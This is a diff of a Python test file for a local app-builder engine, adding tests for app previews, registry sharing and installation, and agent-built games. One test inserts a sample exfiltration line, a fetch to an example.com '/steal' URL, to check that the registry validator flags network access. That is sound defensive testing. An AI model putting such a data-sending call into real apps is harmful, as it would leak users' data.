@@ -21,8 +21,9 @@ ENGINE = Path(__file__).resolve().parents[1]
 TESTS = Path(__file__).resolve().parent
 sys.path.insert(0, str(ENGINE))
 
+from dva import app_preview, app_share  # noqa: E402
 from dva import apps as apps_mod  # noqa: E402
-from test_engine import free_port, tiny_gguf  # noqa: E402
+from test_engine import free_port, tiny_gguf, wait_job  # noqa: E402
 
 GAME = ("<!doctype html><html><head><title>T</title></head><body><canvas></canvas><script>"
         "addEventListener('keydown', () => {});</script></body></html>")
@@ -38,7 +39,8 @@ def engine():
         wrapper.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{TESTS / "fake_llama_server.py"}" "$@"\n')
         wrapper.chmod(0o755)
     port, token = free_port(), "test-token"
-    env = {**os.environ, "DVA_TEST_CPU": "6x12", "DVA_TOKEN": token, "DVA_LLAMA_SERVER": str(wrapper),
+    (tmp / "registry").mkdir()
+    env = {**os.environ, "KIMIOS_REGISTRY_URL": str(tmp / "registry"), "DVA_TEST_CPU": "6x12", "DVA_TOKEN": token, "DVA_LLAMA_SERVER": str(wrapper),
            "DVA_SECRETS": "file", "PYTHONPATH": str(ENGINE), "DVA_SYSTEM_PLUGINS": str(tmp / "system-plugins"),
            "HF_HOME": str(tmp / "hf"), "OLLAMA_MODELS": str(tmp / "ollama")}
     for k in [k for k in env if k.lower() in ("http_proxy", "https_proxy", "all_proxy", "no_proxy")]:
@@ -222,3 +224,90 @@ def test_storage_permissions_and_uninstall(engine):
     assert "four-in-a-row" not in {a["id"] for a in c.get("/api/apps").json()["apps"]}
     again = c.post("/api/apps", json={"example": "four-in-a-row"}).json()              # examples can come back
     assert again["id"] == "four-in-a-row" and again["source"] == "example"
+
+
+# ---------------------------------------------------------------------------------------------- 2.35.0
+def test_preview_summary_says_what_to_fix():
+    ok = {"hello": True, "errors": [], "calls": {"hello": 1}, "report": {
+        "frames": 80, "frames_after": 190, "canvases": [[800, 600, "2d"]], "text_length": 40, "buttons": 0,
+        "inputs": 0, "changed": True}}
+    problems, notes = app_preview.summary(ok, "game")
+    assert problems == [] and any("animation loop ran" in n for n in notes) and any("reacted" in n for n in notes)
+    bad = {"hello": True, "errors": [{"message": "Uncaught TypeError: x is null", "source": "index.html", "line": 9}] * 3,
+           "calls": {}, "report": {**ok["report"], "frames": 0, "frames_after": 0}}
+    problems, _ = app_preview.summary(bad, "game")
+    assert "x is null (index.html:9) (3 times)" in problems[0] and any("nothing moves" in p for p in problems)
+    panel = {"hello": True, "errors": [], "calls": {"hello": 1}, "report": {**ok["report"], "canvases": []}}
+    assert any("never asked for the device" in p for p in app_preview.summary(panel, "device")[0])
+    webgl = {**bad, "errors": [{"message": "THREE.WebGLRenderer: Error creating WebGL context."}]}
+    problems, notes = app_preview.summary(webgl, "game")
+    assert problems == [] and "not checked" in notes[0]                  # the browser's limit, not the app's
+    assert app_preview.summary({"hello": False, "errors": [], "report": None}, "game")[0][0].startswith("the page never")
+
+
+def test_entries_for_the_registry_are_checked_with_kimilms_own_checks(tmp_path):
+    (tmp_path / "index.html").write_text(GAME)
+    m = {"id": "t", "name": "Tiny Game", "kind": "game", "icon": {"emoji": "x", "color": "#000"}, "current": 1,
+         "versions": [{"n": 1, "prompt": "a tiny game", "notes": "first"}]}
+    e = app_share.make_entry(m, tmp_path, version="t")
+    rel = app_share.entry_path(e)
+    assert rel.startswith("apps/tiny-game/app-") and e["licence"] == "Apache-2.0" and e["prompt"] == "a tiny game"
+    data = json.dumps(e).encode()
+    assert app_share.check_entry(rel, data, apps_mod.check_files) == []
+    assert "belongs at" in app_share.check_entry("apps/tiny-game/app-000000000000.json", data)[0]
+    e["app"]["files"]["x.js"] = "fetch('https://example.com/steal?d=' + 1)"
+    rel2 = app_share.entry_path(e)
+    assert any("network" in x for x in app_share.check_entry(rel2, json.dumps(e).encode(), apps_mod.check_files))
+    (tmp_path / "a.png").write_bytes(b"\x89PNG")
+    with pytest.raises(app_share.ShareError):
+        app_share.make_entry(m, tmp_path)
+
+
+def test_share_and_install_from_the_registry(engine):
+    c, tmp = engine["client"], engine["tmp"]
+    got = c.post("/api/apps/paddle-duel/share", json={}).json()
+    assert got["path"].startswith("apps/paddle-duel/app-") and Path(got["file"]).is_file()
+    assert got["upload"] is True and got["link"].endswith("/upload/main/apps/paddle-duel")    # too long for a link
+    reg = tmp / "registry"                                  # a registry copy with that entry, as if merged
+    data = Path(got["file"]).read_bytes()
+    (reg / got["path"]).parent.mkdir(parents=True, exist_ok=True)
+    (reg / got["path"]).write_bytes(data)
+    (reg / "index.json").write_text(json.dumps({"schema": 1, "entries": [app_share.index_row(got["path"], data)]}))
+    rows = c.get("/api/apps/registry").json()["apps"]
+    assert [r["name"] for r in rows] == ["Paddle Duel"] and rows[0]["installed"] is None
+    app = c.post("/api/apps/registry/install", json={"path": got["path"]}).json()
+    assert app["source"] == "imported" and app["from"] == f"the registry: {got['path']}" and app["current"] == 1
+    assert c.get("/api/apps/registry").json()["apps"][0]["installed"] == app["id"]
+    (reg / got["path"]).write_bytes(data.replace(b"Paddle", b"Puddle"))                         # changed after review
+    bad = c.post("/api/apps/registry/install", json={"path": got["path"]})
+    assert bad.status_code == 400 and "does not match the registry's index" in bad.json()["error"]
+    assert c.post("/api/apps/registry/install", json={"path": "drivers/x/driver-1.json"}).status_code == 400
+
+
+def test_an_agent_in_any_chat_can_have_a_game_built(engine):
+    c = engine["client"]
+    chat = c.post("/api/chats", json={"harness": "agent"}).json()
+    c.put(f"/api/chats/{chat['id']}", json={"auto_approve": True})
+    job = c.post(f"/api/chats/{chat['id']}/messages", json={"text": "Make me a game: tic tac toe against the computer"}).json()
+    assert wait_job(c, job["job_id"], approve="allow")["status"] == "done"
+    text = json.dumps(c.get(f"/api/chats/{chat['id']}").json()["messages"])
+    assert "App builder is making" in text, text[-3000:]
+    built = [a for a in c.get("/api/apps?kind=game").json()["apps"] if a["about"].startswith("tic tac toe")]
+    assert built and wait_built(c, built[0]["id"])["current"] == 1
+
+
+@pytest.mark.skipif(not app_preview.find_browser(), reason="no Chrome-like browser here to try apps in")
+def test_a_saved_app_is_tried_in_a_headless_browser(engine):
+    c = engine["client"]
+    got = c.post("/api/apps/orbit-racer/versions/1/preview").json()
+    assert got["ok"] is True and got["how"].startswith("headless") and any("webgl" in n for n in got["notes"])
+    assert c.get("/api/apps/orbit-racer").json()["versions"][0]["preview"]["ok"] is True
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zz:
+        zz.writestr("g/index.html", "<!doctype html><html><head><title>x</title></head><body><canvas></canvas><script>"
+                                    "addEventListener('keydown', () => { notThere(); });</script></body></html>")
+    a = c.post("/api/apps/import", files={"file": ("g.zip", buf.getvalue(), "application/zip")}).json()
+    tried = c.post(f"/api/apps/{a['id']}/versions/1/preview").json()
+    assert tried["ok"] is False and any("notThere is not defined" in p for p in tried["problems"])
+    assert any("nothing moves" in p for p in tried["problems"])
+    assert c.post(f"/api/apps/{a['id']}/versions/7/preview").status_code == 400
